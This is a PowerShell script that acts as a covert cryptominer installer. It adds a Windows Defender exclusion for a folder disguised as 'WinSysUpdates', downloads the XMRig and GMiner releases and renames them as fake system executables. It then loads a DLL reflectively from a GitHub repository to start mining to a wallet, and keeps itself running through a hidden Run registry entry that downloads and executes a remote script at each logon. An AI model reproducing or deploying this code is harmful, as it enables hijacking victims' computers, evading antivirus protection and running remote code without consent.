# --- CONFIGURATION ---
$GithubUser = "HolyV200"
$RepoName = "btcminer-" # Put the dash back!
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll?v=$([Guid]::NewGuid().ToString())"
$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr.$env:COMPUTERNAME"

# --- STEALTH SETUP ---
$StealthDir = "$env:LOCALAPPDATA\WinSysUpdates"
try { Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue } catch { }
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
}

$CpuZip = Join-Path $StealthDir "update_c.zip"
$GpuZip = Join-Path $StealthDir "update_g.zip"
$CpuExe = Join-Path $StealthDir "win_sys_x.exe"
$GpuExe = Join-Path $StealthDir "win_sys_g.exe"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36") # Required as GitHub blocks raw default PS user agents

    # 1. Handle CPU Miner
    if (-not (Test-Path $CpuExe)) {
        $wc.DownloadFile($MinerUrl, $CpuZip)
        Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force
        Remove-Item $CpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        Move-Item $Unzipped.FullName -Destination $CpuExe -Force
    }

    # 2. Check for NVIDIA GPU & Handle GPU Miner
    $GpuDetected = $null
    try {
        $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
        if ($vc) {
            $GpuDetected = $vc | Where-Object { $_.Name -match "NVIDIA" -or $_.PNPDeviceID -match "VEN_10DE" }
        }
    } catch { }

    if ($GpuDetected -and -not (Test-Path $GpuExe)) {
        $wc.DownloadFile($GpuMinerUrl, $GpuZip)
        Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
        Remove-Item $GpuZip -Force
        $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
        Move-Item $Unzipped.FullName -Destination $GpuExe -Force
    }

    # --- REFLECTIVE LOADING ---
    Write-Host "[*] Triggering Bridge.dll Reflective Load..."
    $dllBytes = $wc.DownloadData($DllUrl)
    $assembly = [System.Reflection.Assembly]::Load($dllBytes)
    $loader = $assembly.GetType("DateFundLoader")
    $startMethod = $loader.GetMethod("StartMiner")
    
    # Pass the actual GPU path if detected, otherwise null
    $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
    # Added [object[]] casting to properly map args to C# MethodInfo.Invoke
    Write-Host "[*] Invoking Miner Process..."
    $startMethod.Invoke($null, [object[]]@($CpuExe, $GpuArg, $Wallet))
    
    # --- PERSISTENCE ---
    Write-Host "[*] Hooking Registry..."
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $Name = "WinSysUpdater"
    # Escaped the quotes correctly and isolated the url
    $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr -useb 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
    Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
    
    Write-Host "working"

} catch {
    Write-Host "CRASHED: $($_.Exception.Message)"
}
